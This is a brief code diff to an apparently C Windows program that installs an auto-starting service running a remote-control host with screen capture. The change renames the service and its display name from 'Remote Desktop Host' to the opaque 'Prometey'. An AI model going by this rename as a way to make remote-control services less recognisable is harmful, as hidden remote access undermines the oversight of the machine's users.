@@ -10,7 +10,7 @@
 // Spawns capture helper in interactive session
 // ═══════════════════════════════════════════════════════════════
 
-#define SERVICE_NAME "RemoteDesktopHost"
+#define SERVICE_NAME "Prometey"
 
 // Forward: the main host logic (connect loop, command handler, etc.)
 extern void host_main_loop();
@@ -328,7 +328,7 @@ static int install_service() {
     SC_HANDLE hSvc = CreateServiceA(
         hSCM,
         SERVICE_NAME,
-        "Remote Desktop Host",
+        "Prometey",
         SERVICE_ALL_ACCESS,
         SERVICE_WIN32_OWN_PROCESS,
         SERVICE_AUTO_START,
